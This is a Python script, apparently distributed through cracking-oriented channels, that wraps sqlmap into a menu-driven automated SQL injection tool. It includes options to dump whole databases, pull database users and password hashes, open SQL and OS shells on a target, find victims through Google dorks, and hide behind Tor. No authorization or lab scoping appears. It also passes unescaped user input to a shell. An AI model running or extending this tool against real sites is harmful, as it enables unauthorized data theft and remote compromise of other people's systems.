#!/usr/bin/env python3
"""
ChowdhuryVai SQLMap - Automated SQL Injection Tool
Developer: ChowdhuryVai
Website: https://github.com/chowdhuryvai
Telegram: https://t.me/darkvaiadmin
Channel: https://t.me/windowspremiumkey
Website: https://crackyworld.com/
Cyber Team: https://cyberteam.chowdhuryvai.top/
"""

import os
import sys
import subprocess
import argparse
import time
import random
from pathlib import Path

class ChowdhuryVaiSQLMap:
    def __init__(self):
        self.banner = """
\033[1;91m
   ██████ ██   ██  ██████  ██     ██ ██    ██ ██████  ██    ██ ██    ██  █████  ██ 
  ██      ██   ██ ██    ██ ██     ██ ██    ██ ██   ██ ██    ██  ██  ██  ██   ██ ██ 
  ██      ███████ ██    ██ ██  █  ██ ██    ██ ██████  ██    ██   ████   ███████ ██ 
  ██      ██   ██ ██    ██ ██ ███ ██ ██    ██ ██   ██ ██    ██    ██    ██   ██ ██ 
   ██████ ██   ██  ██████   ███ ███   ██████  ██   ██  ██████     ██    ██   ██ ██ 
\033[1;97m
                        ███████  ██████  ██      ███    ███  █████  ██████  
                        ██      ██    ██ ██      ████  ████ ██   ██ ██   ██ 
                        ███████ ██    ██ ██      ██ ████ ██ ███████ ██████  
                             ██ ██    ██ ██      ██  ██  ██ ██   ██ ██   ██ 
                        ███████  ██████  ███████ ██      ██ ██   ██ ██   ██ 
\033[0m
\033[1;93m                    Automated SQL Injection Tool by ChowdhuryVai\033[0m
\033[1;96m              Telegram: @darkvaiadmin | Channel: @windowspremiumkey\033[0m
\033[1;95m                  Website: https://crackyworld.com/\033[0m
\033[1;92m                Cyber Team: https://cyberteam.chowdhuryvai.top/\033[0m
"""
        
        self.features = [
            "Vulnerability check and information research (Databases, tables)",
            "Users, passwords and privileges research",
            "Open SQL Shell",
            "Open OS Shell",
            "Dump single table (CSV)",
            "Dump single table (HTML)",
            "Dump single database (CSV)",
            "Dump single database (HTML)",
            "Dump all databases (CSV)",
            "Dump all databases (HTML)",
            "Retrieve everything (CSV) - can take a long time!",
            "Retrieve everything (HTML) - can take a long time!"
        ]
        
        self.colors = {
            'red': '\033[91m',
            'green': '\033[92m',
            'yellow': '\033[93m',
            'blue': '\033[94m',
            'purple': '\033[95m',
            'cyan': '\033[96m',
            'white': '\033[97m',
            'bold': '\033[1m',
            'end': '\033[0m'
        }

    def print_banner(self):
        print(self.banner)

    def check_sqlmap(self):
        """Check if sqlmap is installed"""
        try:
            subprocess.run(["sqlmap", "--version"], capture_output=True, check=True)
            return True
        except (subprocess.CalledProcessError, FileNotFoundError):
            return False

    def check_tor(self):
        """Check if Tor is running"""
        try:
            result = subprocess.run(["curl", "--socks5", "localhost:9050", "http://check.torproject.org/"], 
                                  capture_output=True, text=True, timeout=10)
            return "Congratulations" in result.stdout
        except:
            return False

    def print_features(self):
        print(f"\n{self.colors['bold']}{self.colors['cyan']}📌 AVAILABLE FEATURES:{self.colors['end']}")
        for i, feature in enumerate(self.features, 1):
            print(f"   {self.colors['yellow']}{i:2d}.{self.colors['end']} {feature}")

    def run_sqlmap_command(self, command):
        """Execute sqlmap command with colorful output"""
        print(f"\n{self.colors['green']}[+] Executing: sqlmap {command}{self.colors['end']}")
        try:
            process = subprocess.Popen(f"sqlmap {command}", shell=True, 
                                     stdout=subprocess.PIPE, stderr=subprocess.STDOUT, 
                                     text=True)
            
            for line in process.stdout:
                if "target" in line.lower() and "url" in line.lower():
                    print(f"{self.colors['cyan']}{line.strip()}{self.colors['end']}")
                elif "payload" in line.lower():
                    print(f"{self.colors['red']}{line.strip()}{self.colors['end']}")
                elif "vulnerable" in line.lower():
                    print(f"{self.colors['green']}{line.strip()}{self.colors['end']}")
                elif "database" in line.lower():
                    print(f"{self.colors['yellow']}{line.strip()}{self.colors['end']}")
                elif "table" in line.lower():
                    print(f"{self.colors['purple']}{line.strip()}{self.colors['end']}")
                elif "column" in line.lower():
                    print(f"{self.colors['blue']}{line.strip()}{self.colors['end']}")
                else:
                    print(line.strip())
            
            process.wait()
            return process.returncode
        except Exception as e:
            print(f"{self.colors['red']}[!] Error: {e}{self.colors['end']}")
            return 1

    def basic_scan(self, url, risk=1, level=1, threads=1, use_tor=False):
        """Perform basic SQL injection scan"""
        tor_option = " --tor --check-tor" if use_tor else ""
        command = f'-u "{url}" --risk={risk} --level={level} --threads={threads}{tor_option} --batch'
        return self.run_sqlmap_command(command)

    def get_databases(self, url, use_tor=False):
        """Get available databases"""
        tor_option = " --tor --check-tor" if use_tor else ""
        command = f'-u "{url}" --dbs{tor_option} --batch'
        return self.run_sqlmap_command(command)

    def get_tables(self, url, database, use_tor=False):
        """Get tables from specific database"""
        tor_option = " --tor --check-tor" if use_tor else ""
        command = f'-u "{url}" -D {database} --tables{tor_option} --batch'
        return self.run_sqlmap_command(command)

    def get_columns(self, url, database, table, use_tor=False):
        """Get columns from specific table"""
        tor_option = " --tor --check-tor" if use_tor else ""
        command = f'-u "{url}" -D {database} -T {table} --columns{tor_option} --batch'
        return self.run_sqlmap_command(command)

    def dump_table(self, url, database, table, output_format='csv', use_tor=False):
        """Dump table data"""
        tor_option = " --tor --check-tor" if use_tor else ""
        command = f'-u "{url}" -D {database} -T {table} --dump{tor_option} --dump-format={output_format} --batch'
        return self.run_sqlmap_command(command)

    def sql_shell(self, url, use_tor=False):
        """Open SQL shell"""
        tor_option = " --tor --check-tor" if use_tor else ""
        command = f'-u "{url}" --sql-shell{tor_option}'
        return self.run_sqlmap_command(command)

    def os_shell(self, url, use_tor=False):
        """Open OS shell"""
        tor_option = " --tor --check-tor" if use_tor else ""
        command = f'-u "{url}" --os-shell{tor_option}'
        return self.run_sqlmap_command(command)

    def get_users(self, url, use_tor=False):
        """Get database users"""
        tor_option = " --tor --check-tor" if use_tor else ""
        command = f'-u "{url}" --users{tor_option} --batch'
        return self.run_sqlmap_command(command)

    def get_passwords(self, url, use_tor=False):
        """Get user passwords"""
        tor_option = " --tor --check-tor" if use_tor else ""
        command = f'-u "{url}" --passwords{tor_option} --batch'
        return self.run_sqlmap_command(command)

    def google_dork(self, dork):
        """Search using Google dorks"""
        command = f'-g "{dork}" --batch'
        return self.run_sqlmap_command(command)

    def interactive_mode(self):
        """Interactive mode for manual control"""
        print(f"\n{self.colors['bold']}{self.colors['cyan']}🚀 Interactive Mode Activated{self.colors['end']}")
        
        url = input(f"{self.colors['yellow']}[?] Enter target URL: {self.colors['end']}")
        use_tor = input(f"{self.colors['yellow']}[?] Use Tor? (y/n): {self.colors['end']}").lower() == 'y'
        
        while True:
            print(f"\n{self.colors['bold']}{self.colors['cyan']}📋 INTERACTIVE MENU:{self.colors['end']}")
            print(f"   {self.colors['yellow']}1.{self.colors['end']} Basic Scan")
            print(f"   {self.colors['yellow']}2.{self.colors['end']} Get Databases")
            print(f"   {self.colors['yellow']}3.{self.colors['end']} Get Tables")
            print(f"   {self.colors['yellow']}4.{self.colors['end']} Get Columns")
            print(f"   {self.colors['yellow']}5.{self.colors['end']} Dump Table")
            print(f"   {self.colors['yellow']}6.{self.colors['end']} SQL Shell")
            print(f"   {self.colors['yellow']}7.{self.colors['end']} OS Shell")
            print(f"   {self.colors['yellow']}8.{self.colors['end']} Get Users")
            print(f"   {self.colors['yellow']}9.{self.colors['end']} Get Passwords")
            print(f"   {self.colors['yellow']}0.{self.colors['end']} Exit")
            
            choice = input(f"\n{self.colors['yellow']}[?] Select option: {self.colors['end']}")
            
            if choice == '1':
                risk = input(f"{self.colors['yellow']}[?] Risk level (1-3, default 1): {self.colors['end']}") or "1"
                level = input(f"{self.colors['yellow']}[?] Level (1-5, default 1): {self.colors['end']}") or "1"
                threads = input(f"{self.colors['yellow']}[?] Threads (1-10, default 1): {self.colors['end']}") or "1"
                self.basic_scan(url, int(risk), int(level), int(threads), use_tor)
            
            elif choice == '2':
                self.get_databases(url, use_tor)
            
            elif choice == '3':
                database = input(f"{self.colors['yellow']}[?] Database name: {self.colors['end']}")
                self.get_tables(url, database, use_tor)
            
            elif choice == '4':
                database = input(f"{self.colors['yellow']}[?] Database name: {self.colors['end']}")
                table = input(f"{self.colors['yellow']}[?] Table name: {self.colors['end']}")
                self.get_columns(url, database, table, use_tor)
            
            elif choice == '5':
                database = input(f"{self.colors['yellow']}[?] Database name: {self.colors['end']}")
                table = input(f"{self.colors['yellow']}[?] Table name: {self.colors['end']}")
                format_choice = input(f"{self.colors['yellow']}[?] Format (csv/html, default csv): {self.colors['end']}") or "csv"
                self.dump_table(url, database, table, format_choice, use_tor)
            
            elif choice == '6':
                self.sql_shell(url, use_tor)
            
            elif choice == '7':
                self.os_shell(url, use_tor)
            
            elif choice == '8':
                self.get_users(url, use_tor)
            
            elif choice == '9':
                self.get_passwords(url, use_tor)
            
            elif choice == '0':
                print(f"{self.colors['green']}[+] Exiting...{self.colors['end']}")
                break
            
            else:
                print(f"{self.colors['red']}[!] Invalid option{self.colors['end']}")

def main():
    tool = ChowdhuryVaiSQLMap()
    tool.print_banner()
    tool.print_features()
    
    parser = argparse.ArgumentParser(description='ChowdhuryVai SQLMap - Automated SQL Injection Tool')
    parser.add_argument('url', nargs='?', help='Target URL')
    parser.add_argument('-r', '--risk', type=int, choices=range(1, 4), default=1, help='Risk level (1-3)')
    parser.add_argument('-l', '--level', type=int, choices=range(1, 6), default=1, help='Level (1-5)')
    parser.add_argument('-t', '--threads', type=int, choices=range(1, 11), default=1, help='Number of threads (1-10)')
    parser.add_argument('-g', '--google-dork', help='Google dork search')
    parser.add_argument('--tor', action='store_true', help='Use Tor for anonymity')
    parser.add_argument('--interactive', action='store_true', help='Start interactive mode')
    parser.add_argument('-v', '--version', action='store_true', help='Show version')
    
    args = parser.parse_args()
    
    if args.version:
        print("ChowdhuryVai SQLMap v1.0.0")
        return
    
    # Check if sqlmap is installed
    if not tool.check_sqlmap():
        print(f"{tool.colors['red']}[!] sqlmap is not installed or not in PATH{tool.colors['end']}")
        print(f"{tool.colors['yellow']}[!] Please install sqlmap: pip install sqlmap{tool.colors['end']}")
        return 1
    
    # Check Tor if requested
    if args.tor and not tool.check_tor():
        print(f"{tool.colors['red']}[!] Tor is not running or not configured{tool.colors['end']}")
        print(f"{tool.colors['yellow']}[!] Please start Tor service or install it{tool.colors['end']}")
        return 1
    
    # Interactive mode
    if args.interactive or not any(vars(args).values()):
        tool.interactive_mode()
        return
    
    # Google dork search
    if args.google_dork:
        tool.google_dork(args.google_dork)
        return
    
    # Basic scan with URL
    if args.url:
        print(f"{tool.colors['green']}[+] Starting automated SQL injection scan...{tool.colors['end']}")
        print(f"{tool.colors['cyan']}[i] Target: {args.url}{tool.colors['end']}")
        print(f"{tool.colors['cyan']}[i] Risk: {args.risk}, Level: {args.level}, Threads: {args.threads}{tool.colors['end']}")
        if args.tor:
            print(f"{tool.colors['cyan']}[i] Using Tor for anonymity{tool.colors['end']}")
        
        tool.basic_scan(args.url, args.risk, args.level, args.threads, args.tor)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
